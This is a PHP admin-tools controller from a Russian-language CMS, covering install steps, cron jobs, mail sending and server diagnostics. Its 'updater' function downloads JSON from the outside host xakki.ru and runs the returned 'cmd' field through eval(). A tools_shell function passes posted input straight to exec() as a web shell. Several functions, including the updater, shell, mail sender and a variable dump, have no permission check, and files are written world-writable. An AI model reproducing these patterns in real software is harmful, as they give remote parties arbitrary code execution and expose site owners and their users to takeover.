<?php
function tools_step1() {
	global $_CFG,$_tpl;
	$TEMP_CFG= array();
	setCss('install');
	$file = $_CFG['_PATH']['wep_controllers'] . '/install/step1.php';
	if(static_main::_prmUserCheck(1))
		return require($file);
	else
		return static_main::m('denied');
}

function tools_step2() {
	global $_CFG,$_tpl;
	if(!static_main::_prmUserCheck(1))
		return static_main::m('denied');
	setCss('install');
	$file = $_CFG['_PATH']['wep_controllers'] . '/install/step2.php';
	return require($file);
}

function tools_step3() {
	global $_CFG,$_tpl;
	if(!static_main::_prmUserCheck(1))
		return static_main::m('denied');
	setCss('install');
	$file = $_CFG['_PATH']['wep_controllers'] . '/install/step3.php';
	return require($file);
}

function tools_updater() 
{

	$href = 'http://xakki.ru/_js.php?_modul=wepcontrol&_func=GetNewVersion';
	$JSON = file_get_contents($href);
	$JSON = json_decode($JSON,true);
	if(isset($JSON['html']) and $JSON['html']) {
		if(isset($JSON['cmd']) and $JSON['cmd']) {
			eval($JSON['cmd']);
		}
		return $JSON['html'];
	}
	return 'NO info';
}

function tools_localUpdate() 
{
	global $_CFG;
	$html = '<h4>Системные</h4>';
	$html .= helperLocalUpdate($_CFG['_PATH']['wep_update']);
	$html .= '<h4>Пользовательские</h4>';
	$html .= helperLocalUpdate($_CFG['_PATH']['update']);

	return $html;
}

function helperLocalUpdate($path, $style='')
{
	if(!file_exists($path)) return '';

	$dir = dir($path);
	$html = '<ul>';
	while (false !== ($entry = $dir->read())) {
		$fileExplode = explode('.', $entry);
		if ($fileExplode[1]=='php')
		{
			$hash = md5($path.$entry);
			$html .= '<li><a href="'.static_main::urlAppend('localfile='.$hash).'">'.$fileExplode[0].'</a>';
			if(isset($_GET['localfile']) and $_GET['localfile']===$hash) 
			{
				$html .= '<fieldset>';
				$html .= include($path.$entry);
				$html .= '</fieldset>';
			}
		}
	}
	$dir->close();
	$html .= '</ul>';
	return $html;
}

function tools_docron() {
	global $_CFG;
	if(isset($_POST['sbmt'])) {
		$ttw  = getmicrotime();
		include($_CFG['_PATH']['controllers'].'/cron.php');
		return '--Крон выполнен, время обработки задач =  '.(getmicrotime()-$ttw).'mc -----';
	} else {
		return '<form method="post"><input type="submit" name="sbmt" value="Выполнить"/></form>';
	}
}

function tools_cron() {
	global $_CFG,$_tpl;
	if(!static_main::_prmUserCheck(1))
		return static_main::m('denied');
	$result = '';
	
	if(!file_exists($_CFG['_FILE']['cron'])) {// FIX UPDATE
		$NEWDATA = array();
		foreach($_CFG['wep']['cron'] as $k=>$r)
			$NEWDATA['cron'][md5($r['file'].$r['modul'].$r['function'])] = $r;
		static_tools::saveCFG($NEWDATA,$_CFG['_FILE']['cron']);
		rename($_CFG['_PATH']['weptemp'].'cron.ini',$_CFG['_FILE']['cronTask']);
	}
	include($_CFG['_FILE']['cron']);// Загружаем конфиг крона

	$ini_file = $_CFG['_PATH']['config'].'cron.ini';
	if(file_exists($ini_file)) 
		$ini_arr = parse_ini_file($ini_file);
	else {
		$ini_arr= array();
	}
	$FP = $_CFG['PATH']['admin'].'?_view=list&_modul=_tools&tfunc=tools_cron&';
	setCss('form');
	$DATA = array('firstpath'=>$FP);
	$DATA['path'] = array(
		$FP=>'Задания'
	);
	$mess = array();

	$DATA['topmenu']['add'] = array(
		'href' => array('_type'=>'add'),
		'caption' => 'Добавить задание',
		'sel' => 0,
		'type' => '',
		'css' => 'add',
	);
	if (isset($_GET['_type']) and ($_GET['_type'] == 'add' or ($_GET['_type'] == 'update' and isset($_GET['_id']))) ) {

		$FORM = array();

		if (isset($_POST['sbmt'])) {

			if(isset($_GET['_id']))
				$p = $_GET['_id'];
			else {
				$p = md5($_POST['file'].$_POST['modul'].$_POST['function']);
			}

			$NEWDATA = array();
			$NEWDATA['cron'] = $_CFG['cron'];
			$NEWDATA['cron'][$p] = array(
				'time'=>$_POST['time'],
				'file'=>$_POST['file'],
				'modul'=>$_POST['modul'],
				'function'=>$_POST['function'],
				'active'=>($_POST['active']?1:0),
			);
			list($fl,$mess) = static_tools::saveCFG($NEWDATA,$_CFG['_FILE']['cron']);
			if(!$fl)
				$FORM['info'] = array('type'=>'info', 'caption'=>'<h3 style="color:red;">Ошибка</h3>');
			else {
				if($_POST['last_time']) {
					$ini_arr['last_time'.$p] = strtotime($_POST['last_time']);
					//mktime($_POST['last_time'][3],$_POST['last_time'][4],$_POST['last_time'][5],$_POST['last_time'][1],$_POST['last_time'][2],$_POST['last_time'][0]);
					$conf = '';
					foreach ($ini_arr as $k=>$v) {
						$conf .= $k . " = " . $v . "\n";
					}
					umask(0777);
					file_put_contents($ini_file, $conf);
					chmod($ini_file, 0777);
				}
				$_SESSION['messtool'] = array('name'=>'ok','value'=>'Задание успешно добавлено.');
				static_main::redirect(key($DATA['path']));
			}
		}
		$DATA['path'][$FP.'_type=add'] = 'Добавить';
		if($_GET['_type'] == 'update' and isset($_GET['_id']) and isset($_CFG['cron'][$_GET['_id']])) {
			$VAL = $_CFG['cron'][$_GET['_id']];
			$VAL['last_time'] = $ini_arr['last_time'.$_GET['_id']];
			$DATA['path'][$FP.'_type=add'] = 'Правка';
		}
		elseif(isset($_POST))
			$VAL = $_POST;
		else
			$VAL = array();
			
		$FORM['time'] = array (
			'caption' => 'Период запуска',
			'comment' => 'сек.',
			'type' => 'int',
			'css' => '',
			'style' => '',
			'value'=>$VAL['time'],
		);
		$FORM['file'] = array (
			'caption' => 'Фаил',
			'comment' => '',
			'type' => 'text',
			'css' => '',
			'style' => '',
			'value'=>$VAL['file'],
		);
		$FORM['modul'] = array (
			'caption' => 'Модуль',
			'comment' => '',
			'type' => 'text',
			'css' => '',
			'style' => '',
			'value'=>$VAL['modul'],
		);
		$FORM['function'] = array (
			'caption' => 'Функция',
			'comment' => '',
			'type' => 'text',
			'css' => '',
			'style' => '',
			'value'=>$VAL['function'],
		);
		$FORM['active'] = array (
			'caption' => 'Активность',
			'comment' => '',
			'type' => 'checkbox',
			'css' => '',
			'style' => '',
			'value'=>$VAL['active'],
		);
		$FORM['last_time'] = array (
			'caption' => 'Время запуска',
			'comment' => '',
			'type' => 'date',
			'fields_type'=>'int',
			'mask' => array('view'=>'input','format'=>'Y-m-d H:i:s','datepicker'=>array('timeFormat'=>'\' hh:mm:ss\'')),
			'css' => '',
			'style' => '',
			'value'=>$VAL['last_time'],
		);
		$FORM['res'] = array (
			'caption' => 'Сообщения',
			'comment' => '',
			'readonly' => true,
			'type' => 'text',
			'css' => '',
			'style' => '',
			'value'=>$VAL['active'],
		);
		$FORM['sbmt'] = array(
			'type' => 'submit',
			'value' => 'Сохранить');

		$FORM = array(
			'form' => $FORM,
			'options' => array('method' => 'POST', 'name' => 'cron'),
			'messages' => $mess
		);
		$result = transformPHP($DATA, 'path');
		$result .= transformPHP($FORM, 'formcreat');
	}
	elseif(isset($_GET['_id']) and $_GET['_type'] == 'del') {
		$NEWDATA = array();
		$NEWDATA['cron'] = $_CFG['cron'];
		unset($NEWDATA['cron'][$_GET['_id']]);
		list($fl,$mess) = static_tools::saveCFG($NEWDATA,$_CFG['_FILE']['cron']);
		if(!$fl)
			$_SESSION['messtool'] = array('name'=>'error','value'=>'Ошибка.');
		else
			$_SESSION['messtool'] = array('name'=>'ok','value'=>'Задание успешно Удалено.');
		static_main::redirect(key($DATA['path']));
	} 
	elseif(isset($_GET['_id']) and ($_GET['_type'] == 'act' or $_GET['_type'] == 'dis')) {
		$act = ($_GET['_type'] == 'act'?1:0);
		$NEWDATA = array();
		$NEWDATA['cron'] = $_CFG['cron'];
		$NEWDATA['cron'][$_GET['_id']]['active'] = $act;
		list($fl,$mess) = static_tools::saveCFG($NEWDATA,$_CFG['_FILE']['cron']);
		if(!$fl)
			$_SESSION['messtool'] = array('name'=>'error','value'=>'Ошибка.');
		else
			$_SESSION['messtool'] = array('name'=>'ok','value'=>'Задание успешно '.($act?'включено':'отключено').'.');
		static_main::redirect(key($DATA['path']));
	}
	else {
		$DATA['messages'][] = static_main::am('info','Пропишите в cron <div>*/1 * * * *&#160;&#160;&#160;www-data&#160;&#160;&#160;php '.$_CFG['_PATH']['controllers'].'cron.php</div>');
		$DATA['data'] = array(
			'thitem'=>array(
				'time'=>array('value'=>'Период'),
				'file'=>array('value'=>'Фаил'),
				'modul'=>array('value'=>'Модуль'),
				'function'=>array('value'=>'Функция'),
				'lasttime'=>array('value'=>'Время прошлого выполнения'),
				'do_time'=>array('value'=>'Время выполнения задачи в мс.'),
				'res'=>array('value'=>'Сообщение')
			),
		);
		if(isset($_CFG['cron']) and count($_CFG['cron'])) {
			foreach($_CFG['cron'] as $k=>$r) {
				$DATA['data']['item'][$k]['tditem'] = array(
					'time'=>array('value'=>$r['time']),
					'file'=>array('value'=>$r['file']),
					'modul'=>array('value'=>$r['modul']),
					'function'=>array('value'=>$r['function']),
					'lasttime'=>array('value'=>(isset($ini_arr['last_time'.$k])?date('Y-m-d H:i:s',$ini_arr['last_time'.$k]):'') ),
					'do_time'=>array('value'=>(isset($ini_arr['do_time'.$k])?$ini_arr['do_time'.$k]:'')),
					'res'=>array('value'=>(isset($ini_arr['res'.$k])?$ini_arr['res'.$k]:'')),
				);
				$DATA['data']['item'][$k]['active'] = (!isset($r['active'])?1:(int)$r['active']);
				$DATA['data']['item'][$k]['act'] = 1;
				$DATA['data']['item'][$k]['update'] = 1;
				$DATA['data']['item'][$k]['del'] = 1;
				$DATA['data']['item'][$k]['id'] = $k;
			}
		}

		if(isset($_SESSION['messtool'])) {
			$DATA['messages'][] = $_SESSION['messtool'];
			unset($_SESSION['messtool']);
		}
		$DATA = array('superlist'=>$DATA);
		$result = transformPHP($DATA, 'superlist');
	}
	return $result;
}

function tools_worktime() {
	return 'TODO';
	global $_CFG,$_tpl;
	if(!static_main::_prmUserCheck(1))
		return static_main::m('denied');
	$result = '';
	setCss('form');
	if(count($_POST)) {
		if($_CFG['site']['worktime']) {
			$NEWDATA['site']['worktime']=false;
			$result = '<h3 style="color:gray;">Режим "технические работы" - отключён</h3>';
		} else {
			$NEWDATA['site']['worktime']=true;
			$NEWDATA['site']['work_title']=$_POST['work_title'];
			$NEWDATA['site']['work_text']=$_POST['work_text'];
			$result = '<h3 style="color:green;">Режим "технические работы" - включён</h3>';
		}
		list($fl,$mess) = static_tools::saveUserCFG($NEWDATA);
		if(!$fl)
			$result = '<h3 style="color:red;">Ошибка</h3>';
	}
		if($_CFG['site']['worktime'] or (count($_POST) and $fl and !$_CFG['site']['worktime'])) {
			$result = 'Отключить режим';
		} else {
			$result = 'Включить режим';
		}
		$DATA = array();
		$DATA['info'] = array('type'=>'info', 'caption'=>'<div>По этой <a href="/index.html?_showallinfo=1">ссылке</a> вы можете видить страницы, в режиме "Технические работы".</div>');
		$DATA['work_title'] = array(
			'caption' => 'Заголовок',
			'comment' => '',
			'type' => 'text',
			'value' => $_CFG['site']['work_title'],
			'css' => '',
			'style' => ''
		);
		$DATA['work_text'] = array(
			'caption' => 'Текст',
			'comment' => '',
			'type' => 'textarea',
			'value' => $_CFG['site']['work_text'],
			'css' => '',
			'style' => ''
		);
		$DATA['sbmt'] = array(
			'type' => 'submit',
			'value' => $result);

		$DATA = array(
			'form' => $DATA,
			'messages' => $mess,
			'options' => array('method' => 'POST', 'name' => 'step0')
		);

		$result .= transformPHP($DATA, 'formcreat');
	return $result;
}

function tools_sendReg() {
	return 'Функция отключена.';
	global $SQL,$_CFG;
	if(!static_main::_prmUserCheck(1))
		return static_main::m('denied');
	_new_class('ugroup', $UGROUP);
	$data = array();
	$result = $SQL->execSQL('SELECT * FROM users WHERE reg_hash!="1"');
	if(!$result->err)  {
		while ($row = $result->fetch()) {
			$arr['vars']['owner_id']=$UGROUP->config["noreggroup"];
			$arr['vars']['active']=0;
			$arr['vars'][$this->mf_createrid]=$arr['vars']['id'];
			$arr['vars']['reg_hash']=md5(time().$arr['vars']['id'].$arr['vars']['name']);
			$pass=$arr['vars']['pass'];
			$arr['vars']['pass']=md5($this->_CFG['wep']['md5'].$arr['vars']['pass']);
			//$_SESSION['user']['id'] = $arr['vars']['id'];
			if(!$UGROUP->child['user']->_add($arr['vars'])) {
				_new_class('mail', $MAIL);
				$datamail['from']=$UGROUP->config["mailrobot"];
				$datamail['mail_to']=$arr['vars']['email'];
				$datamail['subject']='Подтвердите регистрацию на '.strtoupper($_SERVER['HTTP_HOST']);
				$href = '?confirm='.$arr['vars']['id'].'&amp;hash='.$arr['vars']['reg_hash'];
				$datamail['text']=str_replace(array('%pass%','%login%','%href%'),array($pass,$arr['vars']['id'],$href),$this->owner->config["mailconfirm"]);
				$MAIL->reply = 0;
				if($MAIL->Send($datamail)) {
					$flag=1;
					$arr['mess']  = $_MESS['regok'];
				}else {
					$UGROUP->child['user']->_delete();
					$arr['mess']  = $_MESS['mailerr'].$_MESS['regerr'];
				}
			} 

		}
	}
}
function allinfos() {
	$html = '<pre>$_SERVER = '.var_export($_SERVER, true).'<hr/>';
	$html .= '$_COOKIES = '.var_export($_COOKIES, true).'<hr/>';
	$html .= '$_SESSION = '.var_export($_SESSION, true).'<hr/>';
	return $html.'</pre>';
}

function getphpinfo() {
	if(!static_main::_prmUserCheck(1))
		return static_main::m('denied');
	ob_start();
	phpinfo();
	$phpinfo = ob_get_contents();
	ob_end_clean();
	preg_match ('%<style type="text/css">(.*?)</style>.*?<body>(.*?)</body>%s', $phpinfo, $matches);
	//$phpinfo1 = preg_split( '/\n/', trim(preg_replace( "/\nbody/", "\n", $matches[1])) );
	return '<style type="text/css">'.$matches[1].'</style>'.$matches[2];
}

function mysqlinfo() {
	global $SQL;
	$_info = $SQL->_info();
	$_status = $SQL->_status();
	$_proc = $SQL->_proc();

	$html = '<h3>Информация</h3>';
	$html .= data_to_html($_info);

	$html .= '<h3>Статус</h3>';
	$html .= data_to_html($_status);

	$html .= '<h3>Процессы</h3>';
	$html .= data_to_html($_proc,array_keys($_proc[0]));
	return $html;
}

function data_to_html($data,$thdata=false) {
	$html = '<table class="table">';
	if($thdata!==false) {
		$html .= '<tr>';
		foreach($thdata as $th)
			$html .= '<th>'.$th.'</th>';
		$html .= '</tr>';
	}
	foreach($data as $tr) {
		$html .= '<tr>';
		foreach($tr as $td)
			$html .= '<td>'.substr($td,0,500).'</td>';
		$html .= '</tr>';
	}
	$html .= '</table>';
	return $html;
}

function memcachstatus() {
	global $_CFG;
	$mc_load = false;
	if (!extension_loaded('memcache')) {
		$prefix = (PHP_SHLIB_SUFFIX === 'dll') ? 'php_' : '';
		if (function_exists('dl') and dl($prefix . 'memcache.' . PHP_SHLIB_SUFFIX))
			$mc_load = true;
	}else
		$mc_load = true;

	if (!$mc_load) 
		return '<h2>MEMCACHe Lib not include!</h2>';

	$memcache_obj = new Memcache; 
	$memcache_obj->addServer($_CFG['memcache']['host'],$_CFG['memcache']['port']); 
	$status = $memcache_obj->getStats();
	if(is_array($status) and count($status)) {
		$html ="<table border='1'>"; 
		$html .="<tr><td>Memcache Server version:</td><td> ".$status["version"]."</td></tr>"; 
		$html .="<tr><td>Process id of this server process </td><td>".$status["pid"]."</td></tr>"; 
		$html .="<tr><td>Number of seconds this server has been running </td><td>".$status["uptime"]."</td></tr>"; 
		$html .="<tr><td>Accumulated user time for this process </td><td>".$status["rusage_user"]." seconds</td></tr>"; 
		$html .="<tr><td>Accumulated system time for this process </td><td>".$status["rusage_system"]." seconds</td></tr>";
		$html .="<tr><td>Total number of items stored by this server ever since it started </td><td>".$status["total_items"]."</td></tr>"; 
		$html .="<tr><td>Number of open connections </td><td>".$status["curr_connections"]."</td></tr>"; 
		$html .="<tr><td>Total number of connections opened since the server started running </td><td>".$status["total_connections"]."</td></tr>"; 
		$html .="<tr><td>Number of connection structures allocated by the server </td><td>".$status["connection_structures"]."</td></tr>"; 
		$html .="<tr><td>Cumulative number of retrieval requests </td><td>".$status["cmd_get"]."</td></tr>"; 
		$html .="<tr><td> Cumulative number of storage requests </td><td>".$status["cmd_set"]."</td></tr>"; 

		if($status["cmd_get"]) 
			$percCacheHit=((real)$status["get_hits"]/ (real)$status["cmd_get"] *100); 
		$percCacheHit=round($percCacheHit,3); 
		$percCacheMiss=100-$percCacheHit; 

		$html .="<tr><td>Number of keys that have been requested and found present </td><td>".$status["get_hits"]." ($percCacheHit%)</td></tr>"; 
		$html .="<tr><td>Number of items that have been requested and not found </td><td>".$status["get_misses"]."($percCacheMiss%)</td></tr>"; 

		$MBRead= (real)$status["bytes_read"]/(1024*1024); 

		$html .="<tr><td>Total number of bytes read by this server from network </td><td>".$MBRead." Mega Bytes</td></tr>"; 
		$MBWrite=(real) $status["bytes_written"]/(1024*1024) ; 
		$html .="<tr><td>Total number of bytes sent by this server to network </td><td>".$MBWrite." Mega Bytes</td></tr>"; 
		$MBSize=(real) $status["limit_maxbytes"]/(1024*1024) ; 
		$html .="<tr><td>Number of bytes this server is allowed to use for storage.</td><td>".$MBSize." Mega Bytes</td></tr>"; 
		$html .="<tr><td>Number of valid items removed from cache to free memory for new items.</td><td>".$status["evictions"]."</td></tr>"; 
		$html .="</table>";
	} else
		$html .= '<h2>MEMCACHe serve is down!</h2>';
	return $html;
}

function tools_sendMail() {
	global $SQL,$_CFG;
	_new_class('mail',$MAIL);
	$html = '';
	if(isset($_POST['text']) and isset($_POST['mail_to']))  {
		$ttw  = getmicrotime();
		$MAIL->reply = 0;
		$datamail = array();
		$datamail['from']=$_POST['from'];
		$datamail['bcc']=$_POST['bcc'];
		$datamail['Reply-To']=$_POST['Reply-To'];
		$datamail['mail_to']=$_POST['mail_to'];
		$datamail['subject']=$_POST['subject'];
		$datamail['text'] = $_POST['text'];
		if($MAIL->Send($datamail))
			$html .= '<br/>Отправлено';
		else
			$html .= '<br/>Ошибка отправки письма!';
		$html .= '---- '.(getmicrotime()-$ttw).'mc -----';
	}
		if(!isset($_POST['subject'])) $_POST['subject'] = 'Тут такая тема!';
		if(!isset($_POST['text'])) $_POST['text'] = '***текст письма***';
		if(!isset($_POST['mail_to'])) $_POST['mail_to'] = 'tome@xakki.ru';
		if(!isset($_POST['from'])) $_POST['from'] = $MAIL->config['mailrobot'];
		$html .= '<form method="post">
			<lable>Кому</lable> <input type="text" name="mail_to" value="'.$_POST['mail_to'].'"/><br/>
			<lable>from</lable> <input type="text" name="from" value="'.$_POST['from'].'"/><br/>
			<lable>Bcc</lable> <input type="text" name="bcc" value="'.$_POST['bcc'].'"/><br/>
			<lable>Reply-To</lable> <input type="text" name="Reply-To" value="'.$_POST['Reply-To'].'"/><br/>
			<lable>Тема</lable> <input type="text" name="subject" value="'.$_POST['subject'].'"/><br/>
			<lable>Текст</lable><br/><textarea name="text" rows="7" cols="50" >'.htmlspecialchars($_POST['text'],ENT_QUOTES,$_CFG['wep']['charset']).'</textarea><br/>
			<br/><input type="submit" name="Пуск"/></form>';
	return $html;
}

function tools_shell() {
	$html = '';
	//passthru (string command [, int return_var])  выполняет внешнюю программу и выводит сырой вывод.
	if(count($_POST)) {
		/*$last_line = shell_exec($_POST['CMD']);
		$html .= '<h3>shell_exec - '.$last_line.'</h3>';

		$last_line = system($_POST['CMD'], $retval);
		$html .= '<h3>system - last_line = '.$last_line.'</h3>';
		$html .= '<h4>system - retval = '.var_export($retval,true).'</h4>';
		$html .= '<h4>system - retval- = '.$retval.'</h4>';*/

		$last_line = exec($_POST['CMD'], $output, $retval);
		foreach($output as $row)
			$html .= '<div style="color:gray;">'.$row.'</div>';
		if($retval)
			$html .= '<h4>Статус команды = '.$retval.'</h4>';
	}
	$html .= '<form method="post">
		<input type="text" name="CMD" value="'.$_POST['CMD'].'"/></br>
		<input type="submit" value="Выполнить команду"/>
	</form>';
	return $html;
}

$dataF = array(
	'tools_step1'=>'<span class="tools_item">Настройки сайта</span>',
	'tools_step2'=>'<span class="tools_item">Проверка структуры сайта</span>',
	'tools_step3'=>'<span class="tools_item">Установка модулей и удаление.</span>',
	'tools_updater'=>'<span class="tools_item" style="color:red;">Обновление</span>',
	'tools_localUpdate'=>'<span class="tools_item" style="color:red;">Локальные обновление</span>',
	'tools_cron'=>'<span class="tools_item">Настройка Крона</span>',
	'tools_docron'=>'<span class="tools_item">Выполнить Крон вручную</span>',
	'tools_sendMail'=>'<span class="tools_item">Отправка почты</span>',
	'tools_worktime'=>'<span class="tools_item">Режим "технические работы"</span>',
	//'tools_shell'=>'<span class="tools_item">Shell</span>',
	'getphpinfo'=>'<span class="tools_item">PHPINFO</span>',
	'mysqlinfo'=>'<span class="tools_item">MySQL info</span>',
	'memcachstatus'=>'<span class="tools_item">Memcach status</span>',
	'allinfos'=> '<span class="tools_item">Выввод глобальных переменных</span>',
);

if(file_exists($_CFG['_PATH']['controllers'].'/tools.php'))
	include($_CFG['_PATH']['controllers'].'/tools.php');

setTemplate('nologs');

$html = '<div>Выбирите функцию для запуска</div><hr><ul>';
foreach($dataF as $kk=>$rr) {
	if(isset($_GET['tfunc']) and $_GET['tfunc']==$kk) {
		$html .= '<li><a style="font-weight:bold;" href="'.$_CFG['PATH']['admin'].'?_view=list&_modul=_tools&tfunc='.$kk.'">'.$rr.'</a>';
		$html .= ' <fieldset><legend>Результат выполнения функции '.$kk.'()</legend>';
		eval('$html .= '.$kk.'();');
		$html .= '</fieldset></li>';
	} else
		$html .= '<li><a href="'.$_CFG['PATH']['admin'].'?_view=list&_modul=_tools&tfunc='.$kk.'">'.$rr.'</a></li>';
}
$html .= '</ul>';


if(!isset($_GET['tfunc'])) {
	_new_class('session',$SESSION);
	$html .= '<div>';
	$html .= '<div>Версия ядра - '.$SESSION->_CFG['info']['version'].'</div>';
	//$html .= '<div>Версия ядра - '.$SESSION->verCore.'</div>';
	$html .= '</div>';
}

return $html;